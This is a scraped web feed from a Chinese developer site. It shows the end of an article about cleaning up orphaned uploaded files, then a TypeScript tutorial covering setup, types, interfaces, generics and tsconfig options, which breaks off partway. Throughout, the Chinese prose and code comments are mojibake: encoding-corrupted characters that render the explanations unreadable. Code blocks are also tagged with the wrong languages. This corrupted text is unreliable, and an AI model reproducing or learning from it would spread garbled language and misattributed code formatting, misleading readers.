<p>â€œç¥äº†å•Šï¼Œâ€èƒ–å“¥å‘äº†ä¸ªå¤§æ‹‡æŒ‡è¡¨æƒ…ï¼Œâ€œè¿™å‘¨æ–‡ä»¶å¢é•¿ç‡ç›´æ¥é™äº† 40%ï¼Œè€Œä¸”æˆ‘çœ‹äº†ä¸‹å‡Œæ™¨çš„æ¸…ç†æ—¥å¿—ï¼Œæ¯å¤©è‡ªåŠ¨åˆ é™¤äº†å‡ ç™¾ä¸ªæ— æ•ˆæ–‡ä»¶ã€‚é‚£ä¸ªæŠ¥è­¦çº¢ç¯ç»ˆäºç­äº†ã€‚â€</p>
<p>å°æ±çœ‹ç€ç›‘æ§å¤§å±ï¼Œé•¿èˆ’äº†ä¸€å£æ°”ï¼šâ€œç»ˆäºä¸ç”¨æ‹…å¿ƒæˆ‘çš„ä¸Šä¼ æ¥å£å˜æˆåƒåœ¾åœºäº†ã€‚â€</p>
<h2 data-id="heading-9">ğŸ’¡ ç»éªŒæ€»ç»“</h2>
<p>è¿™æ¬¡æ²»ç†ï¼Œè®©æˆ‘ä»¬æ˜ç™½äº†ä¸€ä¸ªé“ç†ï¼š<strong>èµ„æºå¿…é¡»è¦æœ‰ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>ã€‚</p>
<p><strong>æ ¸å¿ƒè¦ç‚¹ï¼š</strong></p>
<ol>
<li><strong>åœºæ™¯åˆ†æ²»</strong>ï¼šå°æ–‡ä»¶ï¼ˆå¤´åƒ/å‡­è¯ï¼‰å¯ç”¨ <strong>FormData æ··åˆæäº¤</strong>ï¼Œç®€å•ç²—æš´é›¶å­¤å„¿ï¼›å¤§æ–‡ä»¶å¿…é¡»èµ° <strong>ä¸¤é˜¶æ®µæäº¤</strong>ã€‚</li>
<li><strong>é»˜è®¤ä¸´æ—¶</strong>ï¼šæ‰€æœ‰å¼‚æ­¥ä¸Šä¼ é»˜è®¤éƒ½æ˜¯â€œä¸´æ—¶æ€â€ï¼Œè®¾ç½® TTLï¼ˆTime To Liveï¼‰ã€‚</li>
<li><strong>åå‘ç¡®è®¤</strong>ï¼šä¸šåŠ¡æäº¤æˆåŠŸæ˜¯æ–‡ä»¶â€œè½¬æ­£â€çš„å”¯ä¸€æ¡ä»¶ã€‚</li>
</ol>
<p><strong>é¿å‘æŒ‡å—ï¼š</strong></p>
<ul>
<li>âŒ <strong>å‘1</strong>ï¼šç›´æ¥è¿”å›æœ€ç»ˆ URLã€‚å»ºè®®è¿”å› <code>fileId</code>ï¼Œè®©åç«¯æœ‰æ§åˆ¶æƒã€‚</li>
<li>âŒ <strong>å‘2</strong>ï¼šä¾èµ–å‰ç«¯åˆ é™¤ã€‚æ°¸è¿œä¸è¦ç›¸ä¿¡å‰ç«¯çš„ <code>onUnload</code> æˆ– <code>Cancel</code> äº‹ä»¶ï¼Œç½‘ç»œä¸€æ–­ä»€ä¹ˆéƒ½å‘ä¸å‡ºæ¥ã€‚</li>
<li>âœ… <strong>æ¨è</strong>ï¼šå¯¹äº OSS/S3ï¼Œè¿˜å¯ä»¥é…ç½® Bucket çš„ Lifecycle è§„åˆ™ä½œä¸ºæœ€åçš„å…œåº•ï¼ˆæ¯”å¦‚ <code>temp/</code> ç›®å½•ä¸‹çš„æ–‡ä»¶ 7 å¤©è‡ªåŠ¨ç‰©ç†åˆ é™¤ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-10">ğŸŒ™ æ”¶å°¾</h2>
<p>è§£å†³å®Œè¿™ä¸ªé—®é¢˜ï¼Œå·²ç»æ˜¯æ·±å¤œã€‚</p>
<p>é˜¿è¾°æ”¶æ‹¾å¥½åŒ…ï¼Œè·¯è¿‡æˆ‘ä»¬å·¥ä½æ—¶è¯´ï¼šâ€œæŠ€æœ¯å€ºå’Œåƒåœ¾æ–‡ä»¶ä¸€æ ·ï¼Œå¦‚æœä¸è®¾å®šæœŸé™å»æ¸…ç†ï¼Œæ€»æœ‰ä¸€å¤©ä¼šçˆ†æ‰ã€‚â€</p>
<p>æˆ‘çœ‹äº†çœ‹æœåŠ¡å™¨ç»¿è‰²çš„çŠ¶æ€ç¯ï¼Œåˆçœ‹äº†çœ‹æ—è¾¹æ­£åœ¨å–å¥¶èŒ¶çš„å°æ±ã€‚</p>
<p>â€œèµ°å§ï¼Œåƒå¤œå®µå»ï¼Ÿâ€æˆ‘æè®®ã€‚</p>
<p>â€œèµ°ï¼æˆ‘è¦åƒçƒ§çƒ¤ï¼â€å°æ±ç«‹åˆ»å¤æ´»ï¼Œä¹‹å‰çš„ç–²æƒ«ä¸€æ‰«è€Œç©ºã€‚</p>
<p>åœ¨è¿™ä¸ªæ•°æ®ä¸æ–­è†¨èƒ€çš„ä¸–ç•Œé‡Œï¼Œæ‡‚å¾—â€œæ–­èˆç¦»â€çš„ç³»ç»Ÿï¼Œæ‰èƒ½è·‘å¾—æ›´è¿œã€‚</p>
<hr/>
<p><em>è¿™é‡Œæ˜¯ã€Šæ·±å¤œä»£ç ã€‹ï¼Œæˆ‘ä»¬ä¸‹æœŸè§ã€‚</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ“˜TypeScript 2026 æœ€æ–°è¯¦ç»†æ•™ç¨‹ï¼ˆä»å…¥é—¨åˆ°å®æˆ˜ï¼‰]]></title>    <link>https://juejin.cn/post/7592518897463820340</link>    <guid>https://juejin.cn/post/7592518897463820340</guid>    <pubDate>2026-01-08T02:11:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592518897463820340" data-draft-id="7592518897463803956" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ“˜TypeScript 2026 æœ€æ–°è¯¦ç»†æ•™ç¨‹ï¼ˆä»å…¥é—¨åˆ°å®æˆ˜ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T02:11:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å“ˆå“ˆOå“ˆå“ˆå“ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/3813562999914157"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ“˜TypeScript 2026 æœ€æ–°è¯¦ç»†æ•™ç¨‹ï¼ˆä»å…¥é—¨åˆ°å®æˆ˜ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3813562999914157/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å“ˆå“ˆOå“ˆå“ˆå“ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:11:30.000Z" title="Thu Jan 08 2026 02:11:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><hr/>
<h2 data-id="heading-0">ğŸ“˜TypeScript 2026 æœ€æ–°è¯¦ç»†æ•™ç¨‹ï¼ˆä»å…¥é—¨åˆ°å®æˆ˜ï¼‰</h2>
<blockquote>
<p><strong>ä¸€å¥è¯æ€»ç»“ï¼šTypeScript = JavaScript + å¼ºç±»å‹ç³»ç»Ÿ</strong><br/>
å®ƒä¸æ˜¯ä¸€é—¨æ–°è¯­è¨€ï¼Œè€Œæ˜¯ç»™ JS åŠ ä¸Šâ€œå®‰å…¨é”â€å’Œâ€œå¯¼èˆªä»ªâ€çš„è¶…é›†ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">ä¸€ã€ä¸ºä»€ä¹ˆ 2026 å¹´å¿…é¡»å­¦ TypeScriptï¼Ÿ</h3>
<h4 data-id="heading-2">âœ… 1. è§£å†³ JavaScript çš„æ ¸å¿ƒç—›ç‚¹</h4>
<ul>
<li><strong>å¼±ç±»å‹é™·é˜±</strong>ï¼šJS åœ¨è¿è¡Œæ—¶æ‰æŠ¥é”™ï¼ˆå¦‚ <code>"5" + 3 = "53"</code>ï¼‰ï¼ŒTS åœ¨<strong>ç¼–ç é˜¶æ®µå°±æ‹¦æˆªé”™è¯¯</strong>ã€‚</li>
<li><strong>ç»´æŠ¤å›°éš¾</strong>ï¼šå¤§å‹é¡¹ç›®ä¸­å˜é‡/å‡½æ•°ç”¨é€”æ¨¡ç³Šï¼ŒTS é€šè¿‡ç±»å‹æ³¨è§£è®©ä»£ç <strong>è‡ªè§£é‡Šã€æ˜“åä½œ</strong>ã€‚</li>
<li><strong>IDE ä½“éªŒå·®</strong>ï¼šJS ç¼ºä¹ç²¾å‡†æç¤ºï¼ŒTS è®© VS Code å®ç°<strong>æ™ºèƒ½è¡¥å…¨ã€è·³è½¬ã€é‡æ„</strong>ã€‚</li>
</ul>
<h4 data-id="heading-3">âœ… 2. è¡Œä¸šç°çŠ¶ï¼ˆ2026ï¼‰</h4>
<ul>
<li><strong>ä¸»æµæ¡†æ¶å…¨é¢æ‹¥æŠ± TS</strong>ï¼šVue 3ã€React 18+ã€Angularã€NestJS é»˜è®¤ä½¿ç”¨ TSã€‚</li>
<li><strong>æ‹›è˜ç¡¬æ€§è¦æ±‚</strong>ï¼š90% ä»¥ä¸Šä¸­é«˜çº§å‰ç«¯å²—ä½æ˜ç¡®è¦æ±‚ â€œç†Ÿç»ƒä½¿ç”¨ TypeScriptâ€ã€‚</li>
<li><strong>å¼€æºç”Ÿæ€æ”¯æŒå®Œå–„</strong>ï¼šå‡ ä¹æ‰€æœ‰ npm åŒ…éƒ½æä¾› <code>@types/xxx</code> ç±»å‹å£°æ˜ã€‚</li>
</ul>
<blockquote>
<p>ğŸ’¡ <strong>å­¦ä¹ å»ºè®®</strong>ï¼šå…ˆæŒæ¡ JS åŸºç¡€ï¼Œå†å­¦ TSâ€”â€”å› ä¸º TS æ˜¯ JS çš„è¶…é›†ï¼</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">äºŒã€å¿«é€Ÿæ­å»ºå¼€å‘ç¯å¢ƒï¼ˆ2026 æ¨èæ–¹å¼ï¼‰</h3>
<h4 data-id="heading-5">1. å…¨å±€å®‰è£… TypeScript</h4>
<pre><code class="hljs language-perl" lang="perl">npm install -g typescript@5.<span class="hljs-number">7</span>  <span class="hljs-comment"># 2026 å¹´ä¸»æµç‰ˆæœ¬ä¸º TS 5.x</span>
</code></pre>
<h4 data-id="heading-6">2. åˆå§‹åŒ–é¡¹ç›®</h4>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-keyword">mkdir</span> <span class="hljs-keyword">my</span>-ts-app &amp;&amp; cd <span class="hljs-keyword">my</span>-ts-app
npm init -<span class="hljs-keyword">y</span>
tsc --init  <span class="hljs-comment"># ç”Ÿæˆ tsconfig.json</span>
</code></pre>
<h4 data-id="heading-7">3. å¼€å‘å·¥å…·æ¨è</h4>
<ul>
<li>
<p><strong>ç¼–è¾‘å™¨</strong>ï¼šVS Codeï¼ˆå†…ç½® TS æ”¯æŒæœ€ä½³ï¼‰</p>
</li>
<li>
<p><strong>æ’ä»¶</strong>ï¼š<code>Code Runner</code>ï¼ˆä¸€é”®è¿è¡Œ <code>.ts</code> æ–‡ä»¶ï¼‰</p>
</li>
<li>
<p><strong>è°ƒè¯•</strong>ï¼šé…åˆ <code>ts-node</code> ç›´æ¥æ‰§è¡Œ TSï¼ˆæ— éœ€æ‰‹åŠ¨ç¼–è¯‘ï¼‰ï¼š</p>
<pre><code class="hljs">npm install -D ts-node
npx ts-node index.ts
</code></pre>
</li>
</ul>
<hr/>
<h3 data-id="heading-8">ä¸‰ã€æ ¸å¿ƒè¯­æ³•è¯¦è§£ï¼ˆé™„ä»£ç ç¤ºä¾‹ï¼‰</h3>
<h4 data-id="heading-9">ğŸ”¹ 1. ç±»å‹æ³¨è§£ï¼ˆType Annotationï¼‰</h4>
<pre><code class="hljs language-ini" lang="ini">let age: <span class="hljs-attr">number</span> = <span class="hljs-number">25</span><span class="hljs-comment">;</span>
let name: <span class="hljs-attr">string</span> = <span class="hljs-string">"Alice"</span><span class="hljs-comment">;</span>
let isActive: <span class="hljs-attr">boolean</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
let hobbies: string<span class="hljs-section">[]</span> = <span class="hljs-section">["coding", "reading"]</span><span class="hljs-comment">;</span>
let tuple: <span class="hljs-section">[string, number]</span> = <span class="hljs-section">["Bob", 30]</span><span class="hljs-comment">; // å…ƒç»„</span>
</code></pre>
<blockquote>
<p>âš ï¸ æ³¨æ„ï¼šä¸€æ—¦æŒ‡å®šç±»å‹ï¼Œå°±ä¸èƒ½èµ‹å€¼å…¶ä»–ç±»å‹ï¼ˆé™¤éæ˜¯å­ç±»å‹æˆ–è”åˆç±»å‹ï¼‰ã€‚</p>
</blockquote>
<hr/>
<h4 data-id="heading-10">ğŸ”¹ 2. ç±»å‹æ¨æ–­ï¼ˆType Inferenceï¼‰â€”â€” èƒ½çœåˆ™çœï¼</h4>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">price</span> = <span class="hljs-number">99.9</span><span class="hljs-comment">;     // TS è‡ªåŠ¨æ¨æ–­ä¸º number</span>
let <span class="hljs-attr">title</span> = <span class="hljs-string">"Hello"</span><span class="hljs-comment">;  // è‡ªåŠ¨æ¨æ–­ä¸º string</span>
// <span class="hljs-attr">price</span> = <span class="hljs-string">"free"</span><span class="hljs-comment">;    // âŒ æŠ¥é”™ï¼ç±»å‹å·²å›ºå®š</span>
</code></pre>
<blockquote>
<p>âœ… <strong>æœ€ä½³å®è·µ</strong>ï¼šåˆå§‹åŒ–æ—¶èµ‹å€¼ â†’ çœç•¥ç±»å‹æ³¨è§£ï¼›å»¶è¿Ÿèµ‹å€¼ â†’ å¿…é¡»æ˜¾å¼å£°æ˜ç±»å‹ã€‚</p>
</blockquote>
<hr/>
<h4 data-id="heading-11">ğŸ”¹ 3. è”åˆç±»å‹ &amp; å­—é¢é‡ç±»å‹</h4>
<pre><code class="hljs language-ini" lang="ini">let status: "loading" | "success" | <span class="hljs-attr">"error"</span> = <span class="hljs-string">"loading"</span><span class="hljs-comment">;</span>
let id: string | <span class="hljs-attr">number</span> = <span class="hljs-string">"user_123"</span><span class="hljs-comment">;</span>
<span class="hljs-attr">id</span> = <span class="hljs-number">456</span><span class="hljs-comment">; // âœ… åˆæ³•</span>
</code></pre>
<hr/>
<h4 data-id="heading-12">ğŸ”¹ 4. æ¥å£ï¼ˆinterfaceï¼‰ vs ç±»å‹åˆ«åï¼ˆtypeï¼‰</h4>

























<table><thead><tr><th>ç‰¹æ€§</th><th><code>interface</code></th><th><code>type</code></th></tr></thead><tbody><tr><td>å¯åˆå¹¶å£°æ˜</td><td>âœ…</td><td>âŒ</td></tr><tr><td>æ”¯æŒ extends/implements</td><td>âœ…</td><td>âŒï¼ˆä½†å¯ç”¨äº¤å‰ç±»å‹ <code>&amp;</code> æ¨¡æ‹Ÿï¼‰</td></tr><tr><td>å¯å®šä¹‰åŸå§‹ç±»å‹/è”åˆç±»å‹</td><td>âŒ</td><td>âœ…</td></tr></tbody></table>
<p><strong>æ¨èç”¨æ³•</strong>ï¼š</p>
<ul>
<li>å¯¹è±¡ç»“æ„ â†’ ä¼˜å…ˆç”¨ <code>interface</code></li>
<li>è”åˆç±»å‹/å…ƒç»„/å·¥å…·ç±»å‹ â†’ ç”¨ <code>type</code></li>
</ul>
<pre><code class="hljs language-ini" lang="ini">interface User {
  name: string<span class="hljs-comment">;</span>
  age: number<span class="hljs-comment">;</span>
}

type <span class="hljs-attr">ID</span> = string | number<span class="hljs-comment">;</span>
type <span class="hljs-attr">Status</span> = <span class="hljs-string">"active"</span> | <span class="hljs-string">"inactive"</span><span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h4 data-id="heading-13">ğŸ”¹ 5. å‡½æ•°ç±»å‹</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ–¹å¼1ï¼šå‚æ•°+è¿”å›å€¼æ³¨è§£</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, <span class="hljs-subst">${name}</span>!`</span>;
}

<span class="hljs-comment">// æ–¹å¼2ï¼šå‡½æ•°ç±»å‹åˆ«å</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">AddFn</span> = <span class="hljs-function">(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">number</span>;
<span class="hljs-keyword">const</span> <span class="hljs-attr">add</span>: <span class="hljs-title class_">AddFn</span> = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x + y;

<span class="hljs-comment">// å¯é€‰å‚æ•° &amp; é»˜è®¤å‚æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createUser</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age?: <span class="hljs-built_in">number</span>, role = <span class="hljs-string">"user"</span></span>) {
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<hr/>
<h4 data-id="heading-14">ğŸ”¹ 6. ç±»ï¼ˆClassï¼‰ä¸è®¿é—®ä¿®é¥°ç¬¦</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-keyword">protected</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  <span class="hljs-title function_">move</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> is moving`</span>); }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
  <span class="hljs-title function_">bark</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> barks!`</span>); <span class="hljs-comment">// âœ… protected å…è®¸å­ç±»è®¿é—®</span>
  }
}
</code></pre>
<ul>
<li><code>public</code>ï¼ˆé»˜è®¤ï¼‰ï¼šä»»ä½•åœ°æ–¹å¯è®¿é—®</li>
<li><code>private</code>ï¼šä»…ç±»å†…éƒ¨</li>
<li><code>protected</code>ï¼šç±»åŠå…¶å­ç±»</li>
</ul>
<hr/>
<h4 data-id="heading-15">ğŸ”¹ 7. æ³›å‹ï¼ˆGenericsï¼‰â€”â€” å†™é«˜å¤ç”¨ç»„ä»¶çš„å…³é”®</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function">function <span class="hljs-title">identity</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params">arg: T</span>): T</span> {
  <span class="hljs-keyword">return</span> arg;
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">let</span> output = identity&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">"hello"</span>);
<span class="hljs-keyword">let</span> nums = identity&lt;number[]&gt;([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);
</code></pre>
<blockquote>
<p>ğŸ’¡ æ³›å‹å¸¸ç”¨äºï¼šæ•°ç»„æ“ä½œã€API è¯·æ±‚å°è£…ã€çŠ¶æ€ç®¡ç†ç­‰ã€‚</p>
</blockquote>
<hr/>
<h4 data-id="heading-16">ğŸ”¹ 8. å†…ç½®å·¥å…·ç±»å‹ï¼ˆUtility Typesï¼‰</h4>
<p>TS å†…ç½®äº†å¤šä¸ªå®ç”¨ç±»å‹ï¼Œæå‡å¼€å‘æ•ˆç‡ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">interface Todo {
  title: string<span class="hljs-comment">;</span>
  completed: boolean<span class="hljs-comment">;</span>
}

// Partial&lt;T&gt;ï¼šæ‰€æœ‰å±æ€§å˜ä¸ºå¯é€‰
type <span class="hljs-attr">PartialTodo</span> = Partial&lt;Todo&gt;<span class="hljs-comment">;</span>

// Readonly&lt;T&gt;ï¼šæ‰€æœ‰å±æ€§åªè¯»
const todo: Readonly&lt;Todo&gt; = { title: "Learn TS", completed: false }<span class="hljs-comment">;</span>
// <span class="hljs-attr">todo.title</span> = <span class="hljs-string">"new"</span><span class="hljs-comment">; // âŒ æŠ¥é”™</span>

// Pick&lt;T, K&gt;ï¼šé€‰å–éƒ¨åˆ†å±æ€§
type <span class="hljs-attr">TodoPreview</span> = Pick&lt;Todo, <span class="hljs-string">"title"</span>&gt;<span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h3 data-id="heading-17">å››ã€é…ç½®æ–‡ä»¶ <code>tsconfig.json</code> æ ¸å¿ƒé€‰é¡¹ï¼ˆ2026 æ¨èé…ç½®ï¼‰</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"compilerOptions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"target"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ES2022"</span><span class="hljs-punctuation">,</span>          <span class="hljs-comment">// ç¼–è¯‘ç›®æ ‡ JS ç‰ˆæœ¬</span>
    <span class="hljs-attr">"module"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"NodeNext"</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// æ¨¡å—ç³»ç»Ÿï¼ˆå…¼å®¹ Node.js ESMï¼‰</span>
    <span class="hljs-attr">"strict"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>              <span class="hljs-comment">// å¯ç”¨æ‰€æœ‰ä¸¥æ ¼ç±»å‹æ£€æŸ¥</span>
    <span class="hljs-attr">"esModuleInterop"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>     <span class="hljs-comment">// å…¼å®¹ CommonJS ä¸ ESM</span>
    <span class="hljs-attr">"skipLibCheck"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// è·³è¿‡ .d.ts ç±»å‹æ£€æŸ¥ï¼ˆåŠ é€Ÿç¼–è¯‘ï¼‰</span>
    <span class="hljs-attr">"outDir"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./dist"</span><span class="hljs-punctuation">,</span>          <span class="hljs-comment">// è¾“å‡ºç›®å½•</span>
    <span class="hljs-attr">"rootDir"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./src"</span>           <span class="hljs-comment">// æºç ç›®å½•</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"include"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"src/**/*"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"exclude"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"node_modules"</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<blockquote>
